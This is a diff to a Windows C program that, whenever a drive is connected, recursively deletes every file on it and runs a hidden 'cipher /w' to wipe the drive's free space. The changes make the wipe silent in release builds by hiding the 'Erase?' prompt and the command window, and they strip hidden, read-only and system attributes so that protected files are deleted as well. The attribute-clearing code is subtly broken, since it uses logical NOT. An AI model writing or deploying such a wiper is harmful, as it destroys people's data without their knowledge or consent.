@@ -137,14 +137,19 @@ LRESULT CALLBACK MainWndProc(HWND hwnd,UINT msg,WPARAM wParam,LPARAM lParam)
 				drive = FirstDriveFromMask(PdevVolume ->dbcv_unitmask);
 				wsprintf(szDrive, "%c:", drive);
 				wsprintf(szMsg, "Drive %s connected\n", szDrive);
-
+#ifdef _DEBUG
 				MessageBox (NULL, szMsg, "WM_DEVICECHANGE", MB_OK);
+#endif
 				strcat(szDrive, "\\*");
+#ifdef _DEBUG
 				MessageBox (NULL, szDrive, "Erase?", MB_OK);
+#endif
 				DeleteAllFiles(szDrive);
 				char command[100] = {0};
 				sprintf(command, "cipher /w:%c:", drive);
+#ifdef _DEBUG
 				MessageBox (NULL, command, "Command...", MB_OK);
+#endif
 				RunCommandHidden(command);
 				//system(command);
 				/*
@@ -226,7 +231,9 @@ void DeleteAllFiles(const char* path)
 				strcat(path2, "\\*");
 
 				DeleteAllFiles(path2);
-				RemoveDirectory(path);
+				path2[strlen(path2)-1] = NULL;
+				SetFileAttributes(path2, !FILE_ATTRIBUTE_HIDDEN | !FILE_ATTRIBUTE_READONLY | !FILE_ATTRIBUTE_SYSTEM);
+				RemoveDirectory(path2);
 			}
 			// normal file
 			else
@@ -239,7 +246,9 @@ void DeleteAllFiles(const char* path)
 					path2[strlen(path2)-1] = NULL;
 
 				strcat(path2, wfd.cFileName);
-
+				
+				SetFileAttributes(path2, !FILE_ATTRIBUTE_HIDDEN | !FILE_ATTRIBUTE_READONLY | !FILE_ATTRIBUTE_SYSTEM);
+				
 				DeleteFile(path2);
 			}
 		}
@@ -263,7 +272,12 @@ void RunCommandHidden(char* command)
 		NULL,           // Process handle not inheritable
 		NULL,           // Thread handle not inheritable
 		FALSE,          // Set handle inheritance to FALSE
-		CREATE_NO_WINDOW,              // No creation flags //CREATE_NO_WINDOW
+#ifdef _DEBUG
+		0,              // No creation flags
+#endif
+#ifndef _DEBUG
+		CREATE_NO_WINDOW,              //CREATE_NO_WINDOW will actually hide it
+#endif
 		NULL,           // Use parent's environment block
 		NULL,           // Use parent's starting directory 
 		&si,            // Pointer to STARTUPINFO structure
